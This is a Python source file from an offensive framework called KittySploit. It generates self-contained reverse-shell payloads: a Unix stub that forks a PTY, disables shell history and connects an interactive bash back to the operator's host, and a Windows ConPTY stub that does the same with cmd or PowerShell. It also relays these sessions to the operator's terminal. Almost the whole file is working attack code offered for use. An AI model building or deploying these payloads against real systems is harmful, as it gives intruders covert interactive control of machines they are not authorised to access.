#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PTY / ConPTY runtime for reverse shells.

- Payload builders emit self-contained Python stubs for targets.
- ``relay_socket_terminal`` bridges a live socket to the local terminal in raw mode
  (operator side) for tab completion, sudo, pagers, etc.
"""

from __future__ import annotations

import os
import platform
import struct
import sys
import threading
import time
from typing import Callable, List, Optional, Tuple

PTY_MAGIC = b"KSPTY1\n"

# Typed alone + Enter in PTY relay → return to KittySploit (session stays open).
LOCAL_RETURN_COMMANDS = frozenset({"back", "background", "exit"})

# Binary winsize frame: 4-byte magic + rows_u16 + cols_u16 (network order).
# Must NOT be the old printable OSC ``\x1b]KSWS;r;c\x07`` — that leaked into
# bash as ``KSWS;59;238`` (``;`` = command separator) whenever the implant
# lacked a matching handler.
KSWS_MAGIC = b"\x1eKSW"  # 4 bytes
KSWS_FRAME_LEN = 8  # magic(4) + rows(2) + cols(2)


def terminal_raw_supported() -> bool:
    """Return True when the operator console can enter raw/cbreak mode."""
    if not hasattr(sys.stdin, "isatty") or not sys.stdin.isatty():
        return False
    if os.name == "nt":
        return True
    return True


def _escape_shell_path(path: str) -> str:
    return str(path).replace("\\", "\\\\").replace("'", "\\'")


def _wrap_transform_io(xf_code: Optional[str]) -> tuple[str, str, str]:
    """Return (decode_expr, encode_expr, on_connect) for optional transform snippets."""
    if not xf_code:
        return ("data", "data", "")
    on_connect = ""
    if "_xf_send_client_hello" in xf_code:
        on_connect = "_xf_send_client_hello(s)\n"
    elif "_xf_send_handshake" in xf_code:
        on_connect = "_xf_send_handshake(s)\n"
    return ("_xf_decode(data)", "_xf_encode(data)", on_connect)


def local_terminal_winsize(default: Tuple[int, int] = (24, 80)) -> Tuple[int, int]:
    """Best-effort local terminal rows/cols for remote TIOCSWINSZ."""
    rows, cols = int(default[0]), int(default[1])
    try:
        import shutil

        size = shutil.get_terminal_size(fallback=(cols, rows))
        cols = max(20, int(size.columns or cols))
        rows = max(5, int(size.lines or rows))
        return rows, cols
    except Exception:
        return rows, cols


def encode_winsize(rows: int, cols: int) -> bytes:
    """Pack a classic ``struct winsize`` (row, col, xpixel, ypixel)."""
    return struct.pack("HHHH", max(1, int(rows)), max(1, int(cols)), 0, 0)


def build_unix_pty_script(
    host: str,
    port: int,
    shell: str = "/bin/bash",
    *,
    xf_code: Optional[str] = None,
    emit_magic: bool = True,
    rows: int = 24,
    cols: int = 80,
) -> str:
    """
    Return Python source for a Unix PTY reverse shell.

    Design notes (avoid blank/hung operator sessions):
    - Never call ``os.setsid()`` after ``pty.fork()`` — the child already has a
      controlling TTY; setsid() breaks interactive bash prompts.
    - Advertise ``KSPTY1`` only after a successful fork so a failed openpty
      cannot leave a dead "PTY" session on the listener.
    - Set winsize + poke ``\\r`` so bash prints a prompt immediately.
    - Treat OSError on the master fd as a clean disconnect.
    """
    host_lit = repr(str(host))
    port_lit = int(port)
    shell_lit = _escape_shell_path(shell)
    rows_i = max(5, int(rows or 24))
    cols_i = max(20, int(cols or 80))
    decode_expr, encode_expr, on_connect = _wrap_transform_io(xf_code)
    magic_send = (
        "s.sendall(" + repr(PTY_MAGIC) + ")\n" if emit_magic else ""
    )
    xf_prefix = (xf_code + "\n") if xf_code else ""
    return (
        xf_prefix
        + "import os,pty,select,socket,struct,fcntl,termios,sys\n"
        + f"h={host_lit};p={port_lit};sh='{shell_lit}'\n"
        + "s=socket.create_connection((h,p))\n"
        + on_connect
        + "try:\n"
        + " pid,fd=pty.fork()\n"
        + "except OSError:\n"
        + " s.close();raise\n"
        + "if pid==0:\n"
        + " os.environ['TERM']=os.environ.get('TERM') or 'xterm-256color'\n"
        + " os.environ['HISTFILE']='/dev/null'\n"
        + f" os.execlp(sh,os.path.basename(sh) or 'sh','-i')\n"
        # Parent only:
        + magic_send
        + "try:\n"
        + f" fcntl.ioctl(fd,termios.TIOCSWINSZ,struct.pack('HHHH',{rows_i},{cols_i},0,0))\n"
        + "except Exception:\n"
        + " pass\n"
        + "try:\n"
        + " os.write(fd,b'\\r')\n"
        + "except Exception:\n"
        + " pass\n"
        + "wb=b''\n"
        + "while True:\n"
        + " try:\n"
        + "  r,_,_=select.select([s,fd],[],[],1.0)\n"
        + " except (ValueError,OSError):\n"
        + "  break\n"
        + " if not r:\n"
        + "  continue\n"
        + " if s in r:\n"
        + "  try:\n"
        + "   chunk=s.recv(8192)\n"
        + "  except OSError:\n"
        + "   break\n"
        + "  if not chunk: break\n"
        + "  data=wb+chunk; wb=b''; out=b''\n"
        # Binary resize: \\x1eKSW + rows_u16 + cols_u16. Also strip legacy OSC.
        + "  while data:\n"
        + "   i=data.find(b'\\x1eKSW'); j=data.find(b'\\x1b]KSWS;')\n"
        + "   if i<0 and j<0: out+=data; data=b''; break\n"
        + "   k=i if (i>=0 and (j<0 or i<=j)) else j\n"
        + "   out+=data[:k]; data=data[k:]\n"
        + "   if data.startswith(b'\\x1eKSW'):\n"
        + "    if len(data)<8: wb=data; data=b''; break\n"
        + "    try:\n"
        + "     rr,cc=struct.unpack('!HH',data[4:8])\n"
        + "     fcntl.ioctl(fd,termios.TIOCSWINSZ,struct.pack('HHHH',rr,cc,0,0))\n"
        + "    except Exception:\n"
        + "     pass\n"
        + "    data=data[8:]; continue\n"
        + "   end=data.find(b'\\x07')\n"
        + "   if end==-1: wb=data; data=b''; break\n"
        + "   data=data[end+1:]\n"
        + "  if not out: continue\n"
        + "  data=out\n"
        + "  try:\n"
        + f"   os.write(fd,{decode_expr})\n"
        + "  except OSError:\n"
        + "   break\n"
        + " if fd in r:\n"
        + "  try:\n"
        + "   data=os.read(fd,8192)\n"
        + "  except OSError:\n"
        + "   break\n"
        + "  if not data: break\n"
        + "  try:\n"
        + f"   s.sendall({encode_expr})\n"
        + "  except OSError:\n"
        + "   break\n"
    )


def build_windows_conpty_script(
    host: str,
    port: int,
    shell: str = "cmd.exe",
    *,
    xf_code: Optional[str] = None,
    emit_magic: bool = True,
) -> str:
    """Return Python source for a Windows ConPTY reverse shell."""
    host_lit = repr(str(host))
    port_lit = int(port)
    shell_lit = _escape_shell_path(shell)
    if shell.lower().endswith("powershell.exe"):
        cmd_lit = _escape_shell_path(shell_lit + " -NoLogo -NoProfile")
    else:
        cmd_lit = shell_lit
    decode_expr, encode_expr, on_connect = _wrap_transform_io(xf_code)
    magic_send = "s.sendall(" + repr(PTY_MAGIC) + ")\n" if emit_magic else ""
    xf_prefix = (xf_code + "\n") if xf_code else ""

    return (
        xf_prefix
        + "import ctypes,socket\nfrom ctypes import wintypes\n"
        + f"h={host_lit};p={port_lit};sh='{cmd_lit}'\n"
        + "s=socket.create_connection((h,p))\n"
        + on_connect
        + magic_send
        + "k=ctypes.windll.kernel32\n"
        + "class C(ctypes.Structure):\n _fields_=[('X',wintypes.SHORT),('Y',wintypes.SHORT)]\n"
        + "class S(ctypes.Structure):\n _fields_=[('X',wintypes.SHORT),('Y',wintypes.SHORT)]\n"
        + "class SI(ctypes.Structure):\n _fields_=[('StartupInfo',wintypes.STARTUPINFOW),('lpAttributeList',ctypes.c_void_p)]\n"
        + "PTC=0x00020016;ESP=0x00080000;CUE=0x00000400\n"
        + "ir=iw=or_=ow=wintypes.HANDLE();sa=wintypes.SECURITY_ATTRIBUTES();sa.nLength=ctypes.sizeof(sa);sa.bInheritHandle=True\n"
        + "if not k.CreatePipe(ctypes.byref(ir),ctypes.byref(iw),ctypes.byref(sa),0):raise ctypes.WinError()\n"
        + "if not k.CreatePipe(ctypes.byref(or_),ctypes.byref(ow),ctypes.byref(sa),0):raise ctypes.WinError()\n"
        + "k.SetHandleInformation(iw,1,0);k.SetHandleInformation(or_,1,0)\n"
        + "hpc=ctypes.c_void_p();sz=S(C(120,40));hr=k.CreatePseudoConsole(sz,ir,ow,0,ctypes.byref(hpc))\n"
        + "if hr:raise OSError('CreatePseudoConsole failed')\n"
        + "k.CloseHandle(ir);k.CloseHandle(ow)\n"
        + "sz2=wintypes.SIZE_T(0);k.InitializeProcThreadAttributeList(None,1,0,ctypes.byref(sz2))\n"
        + "al=ctypes.create_string_buffer(sz2.value)\n"
        + "if not k.InitializeProcThreadAttributeList(al,1,0,ctypes.byref(sz2)):raise ctypes.WinError()\n"
        + "if not k.UpdateProcThreadAttribute(al,0,PTC,hpc,ctypes.sizeof(hpc),None,None):raise ctypes.WinError()\n"
        + "si=SI();si.StartupInfo.cb=ctypes.sizeof(SI);si.lpAttributeList=ctypes.cast(al,ctypes.c_void_p)\n"
        + "pi=wintypes.PROCESS_INFORMATION();cmd=sh if sh.endswith('\\0') else sh+'\\0'\n"
        + "if not k.CreateProcessW(None,ctypes.create_unicode_buffer(cmd),None,None,False,ESP|CUE,None,None,ctypes.byref(si.StartupInfo),ctypes.byref(pi)):raise ctypes.WinError()\n"
        + "k.DeleteProcThreadAttributeList(al)\n"
        + "ci,co=int(iw),int(or_)\n"
        + "def _rh(h):\n b=ctypes.create_string_buffer(4096);n=wintypes.DWORD(0);ok=k.ReadFile(wintypes.HANDLE(h),b,4096,ctypes.byref(n),None);return b.raw[:n.value] if ok and n.value else b''\n"
        + "def _wh(h,d):\n"
        + " if not d: return\n n=wintypes.DWORD(0)\n"
        + " if not k.WriteFile(wintypes.HANDLE(h),d,len(d),ctypes.byref(n),None): raise ctypes.WinError()\n"
        + "while True:\n"
        + " try:\n"
        + "  data=_rh(co)\n"
        + f"  if data: s.sendall({encode_expr})\n"
        + "  elif data==b'': break\n"
        + "  data=s.recv(4096)\n"
        + "  if not data: break\n"
        + f"  _wh(ci,{decode_expr})\n"
        + " except: break\n"
    )


class _TerminalState:
    def __init__(self):
        self.old_termios = None
        self.old_console_mode = None


def _enter_raw_mode(state: _TerminalState) -> bool:
    if os.name == "nt":
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-10)  # STD_INPUT_HANDLE
        mode = wintypes.DWORD()
        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            return False
        state.old_console_mode = mode.value
        ENABLE_ECHO_INPUT = 0x0004
        ENABLE_LINE_INPUT = 0x0002
        ENABLE_PROCESSED_INPUT = 0x0001
        new_mode = mode.value & ~(ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT)
        ENABLE_VIRTUAL_TERMINAL_INPUT = 0x0200
        new_mode |= ENABLE_VIRTUAL_TERMINAL_INPUT
        if not kernel32.SetConsoleMode(handle, new_mode):
            return False
        return True

    import termios
    import tty

    fd = sys.stdin.fileno()
    state.old_termios = termios.tcgetattr(fd)
    tty.setraw(fd)
    return True


def _restore_terminal(state: _TerminalState) -> None:
    if os.name == "nt":
        if state.old_console_mode is None:
            return
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-10)
        kernel32.SetConsoleMode(handle, wintypes.DWORD(state.old_console_mode))
        return

    if state.old_termios is None:
        return
    import termios

    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, state.old_termios)


def _encode_remote_winsize(rows: int, cols: int) -> bytes:
    """Pack a binary winsize frame (never printable ``KSWS;r;c`` shell text)."""
    return KSWS_MAGIC + struct.pack(
        "!HH",
        max(1, min(0xFFFF, int(rows))),
        max(1, min(0xFFFF, int(cols))),
    )


def _send_winsize(connection, rows: int, cols: int) -> None:
    try:
        connection.sendall(_encode_remote_winsize(rows, cols))
    except OSError:
        pass


def _crlf_normalize(data: bytes) -> bytes:
    """Ensure local raw-mode display gets CR before each LF (no staircase)."""
    if not data:
        return data
    # Collapse CRLF/CR to LF, then expand to CRLF for the operator TTY.
    return data.replace(b"\r\n", b"\n").replace(b"\r", b"\n").replace(b"\n", b"\r\n")


class _OperatorLineTracker:
    """Track the operator's current line to detect local return commands in PTY mode."""

    def __init__(self, *, enter: bytes = b"\r") -> None:
        # Unix PTY expects bare CR; ConPTY wants CRLF.
        self._enter = enter or b"\r"
        self._line: List[str] = []

    def clear(self) -> None:
        self._line.clear()

    def process(self, chunk: bytes) -> Tuple[str, bytes]:
        """
        Process raw operator keystrokes.

        Returns ``(action, forward_bytes)`` where *action* is:
        - ``break`` — leave PTY relay (Ctrl+] or local return command)
        - ``forward`` — send *forward_bytes* to the remote PTY
        """
        if not chunk:
            return "forward", b""
        if b"\x1d" in chunk:
            return "break", b""

        out = bytearray()
        i = 0
        while i < len(chunk):
            b = chunk[i]
            if b in (0x0D, 0x0A):
                cmd = "".join(self._line).strip().lower()
                self._line.clear()
                if cmd in LOCAL_RETURN_COMMANDS:
                    # Kill the echoed command on the remote line (Ctrl+U), stay connected.
                    return "break", b"\x15"
                out.extend(self._enter)
                i += 1
                # Swallow LF in CRLF so we do not submit twice (double prompt).
                if b == 0x0D and i < len(chunk) and chunk[i] == 0x0A:
                    i += 1
                continue
            if b in (0x7F, 0x08):
                if self._line:
                    self._line.pop()
                out.append(b)
                i += 1
                continue
            if b == 0x03:
                self.clear()
                out.append(b)
                i += 1
                continue
            if b == 0x15:
                self.clear()
                out.append(b)
                i += 1
                continue
            if b == 0x1B:
                self.clear()
                out.append(b)
                i += 1
                while i < len(chunk):
                    out.append(chunk[i])
                    if chunk[i] < 0x40 or chunk[i] == 0x7E:
                        i += 1
                        break
                    i += 1
                continue
            if 32 <= b < 127:
                self._line.append(chr(b))
                out.append(b)
                i += 1
                continue
            out.append(b)
            i += 1
        return "forward", bytes(out)


def process_operator_pty_input(tracker: _OperatorLineTracker, chunk: bytes) -> Tuple[str, bytes]:
    """Public wrapper for tests — see ``_OperatorLineTracker.process``."""
    return tracker.process(chunk)


def probe_socket_liveliness(
    connection,
    *,
    timeout: float = 1.5,
    poke: bytes = b"\r",
) -> bool:
    """
    Return True when the remote PTY answers a tiny poke within *timeout*.

    Consumes any pending banner/prompt bytes — prefer using
    ``relay_socket_terminal`` which pokes and auto-aborts on silence.
    """
    if connection is None:
        return False
    old_timeout = None
    try:
        if hasattr(connection, "gettimeout"):
            old_timeout = connection.gettimeout()
        connection.settimeout(max(0.2, float(timeout)))
        if poke:
            connection.sendall(poke)
        deadline = time.time() + max(0.2, float(timeout))
        while time.time() < deadline:
            try:
                data = connection.recv(4096)
            except TimeoutError:
                continue
            except OSError:
                return False
            if not data:
                return False
            if data == PTY_MAGIC or (
                data.startswith(PTY_MAGIC) and len(data) == len(PTY_MAGIC)
            ):
                continue
            return True
        return False
    except OSError:
        return False
    finally:
        if hasattr(connection, "settimeout") and old_timeout is not None:
            try:
                connection.settimeout(old_timeout)
            except Exception:
                pass


def _send_remote_sigint(connection) -> bool:
    """Deliver Ctrl+C (\\x03) to the remote PTY so the foreground job gets SIGINT."""
    try:
        connection.sendall(b"\x03")
        return True
    except OSError:
        return False


def relay_socket_terminal(
    connection,
    *,
    stop_bytes: bytes = b"\x1d",  # Ctrl+]
    on_disconnect: Optional[Callable[[], None]] = None,
    banner_timeout: float = 0.25,
    alive_timeout: float = 3.0,
) -> bool:
    """
    Bridge *connection* (socket-like sendall/recv/settimeout) to local terminal.

    Ctrl+C is always forwarded as ``\\x03`` to the remote PTY (never exits the
    relay). Ctrl+] returns to KittySploit. Returns False when the remote never
    produced output (dead/broken PTY) so callers can fall back to line mode.
    """
    if not terminal_raw_supported():
        return False

    import signal

    state = _TerminalState()
    stop = threading.Event()
    got_output = threading.Event()
    remote_eof = threading.Event()
    rows, cols = local_terminal_winsize()
    old_sigint = None
    old_sigwinch = None
    win_ctrl_handler = None

    def _recv_loop():
        connection.settimeout(0.2)
        stripped_magic = False
        while not stop.is_set():
            try:
                data = connection.recv(8192)
                if not data:
                    remote_eof.set()
                    stop.set()
                    break
                if not stripped_magic and data.startswith(PTY_MAGIC):
                    data = data[len(PTY_MAGIC) :]
                    stripped_magic = True
                if not data:
                    continue
                got_output.set()
                # tty.setraw() clears ONLCR; remote LF-only output would staircase.
                sys.stdout.buffer.write(_crlf_normalize(data))
                sys.stdout.flush()
            except TimeoutError:
                continue
            except OSError:
                remote_eof.set()
                stop.set()
                break
            except Exception:
                remote_eof.set()
                stop.set()
                break

    def _on_sigint(_signum, _frame):
        # Prefer forwarding over raising KeyboardInterrupt in the main thread.
        if not _send_remote_sigint(connection):
            stop.set()

    def _on_sigwinch(_signum, _frame):
        try:
            r, c = local_terminal_winsize()
            _send_winsize(connection, r, c)
        except Exception:
            pass

    if not _enter_raw_mode(state):
        return False

    try:
        old_sigint = signal.signal(signal.SIGINT, _on_sigint)
    except Exception:
        old_sigint = None

    if hasattr(signal, "SIGWINCH"):
        try:
            old_sigwinch = signal.signal(signal.SIGWINCH, _on_sigwinch)
        except Exception:
            old_sigwinch = None

    if os.name == "nt":
        try:
            import ctypes

            HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)

            def _ctrl_handler(ctrl_type):
                # 0 = CTRL_C_EVENT — forward, do not kill the process.
                if int(ctrl_type) == 0:
                    _send_remote_sigint(connection)
                    return True
                return False

            win_ctrl_handler = HandlerRoutine(_ctrl_handler)
            ctypes.windll.kernel32.SetConsoleCtrlHandler(win_ctrl_handler, True)
        except Exception:
            win_ctrl_handler = None

    print(
        "\r\n[PTY mode - Ctrl+C remote, Ctrl+] or back/background/exit + Enter returns to KittySploit]\r\n",
        end="",
        flush=True,
    )

    reader = threading.Thread(target=_recv_loop, daemon=True)
    reader.start()

    time.sleep(max(0.0, float(banner_timeout)))
    _send_winsize(connection, rows, cols)
    try:
        connection.sendall(b"\r")
    except OSError:
        stop.set()

    def _watchdog():
        deadline = time.time() + max(0.5, float(alive_timeout))
        while time.time() < deadline and not stop.is_set():
            if got_output.is_set():
                return
            time.sleep(0.1)
        if stop.is_set() or got_output.is_set():
            return
        try:
            sys.stdout.buffer.write(
                b"\r\n[!] PTY silent - returning to KittySploit (try line mode).\r\n"
            )
            sys.stdout.flush()
        except Exception:
            pass
        stop.set()

    threading.Thread(target=_watchdog, daemon=True).start()

    enter_key = b"\r\n" if os.name == "nt" else b"\r"
    line_tracker = _OperatorLineTracker(enter=enter_key)
    try:
        while not stop.is_set():
            try:
                if os.name == "nt":
                    import msvcrt

                    if not msvcrt.kbhit():
                        time.sleep(0.02)
                        continue
                    ch = msvcrt.getwch()
                    if ch == "\x1d":
                        break
                    if ch == "\x03":
                        line_tracker.clear()
                        if not _send_remote_sigint(connection):
                            stop.set()
                            break
                        continue
                    data = ch.encode("utf-8", errors="replace")
                    action, forward = line_tracker.process(data)
                else:
                    data = os.read(sys.stdin.fileno(), 4096)
                    if not data:
                        break
                    action, forward = line_tracker.process(data)
            except KeyboardInterrupt:
                if not _send_remote_sigint(connection):
                    stop.set()
                    break
                continue

            if action == "break":
                if forward:
                    try:
                        connection.sendall(forward)
                    except OSError:
                        pass
                break

            if not forward:
                continue

            try:
                connection.sendall(forward)
            except OSError:
                stop.set()
                break
    finally:
        stop.set()
        reader.join(timeout=1.0)
        if old_sigint is not None:
            try:
                signal.signal(signal.SIGINT, old_sigint)
            except Exception:
                pass
        if old_sigwinch is not None and hasattr(signal, "SIGWINCH"):
            try:
                signal.signal(signal.SIGWINCH, old_sigwinch)
            except Exception:
                pass
        if win_ctrl_handler is not None and os.name == "nt":
            try:
                import ctypes

                ctypes.windll.kernel32.SetConsoleCtrlHandler(win_ctrl_handler, False)
            except Exception:
                pass
        _restore_terminal(state)
        print("\r\n", end="", flush=True)
        if on_disconnect:
            try:
                on_disconnect()
            except Exception:
                pass

    if not got_output.is_set() and not remote_eof.is_set():
        return False
    return True


def probe_remote_pty(connection, timeout: float = 1.5) -> bool:
    """Return True when the remote endpoint already sent the PTY magic banner."""
    try:
        connection.settimeout(timeout)
        chunk = connection.recv(len(PTY_MAGIC) + 16)
        if chunk.startswith(PTY_MAGIC):
            return True
        return False
    except Exception:
        return False


def operator_platform_label() -> str:
    return platform.system().lower()
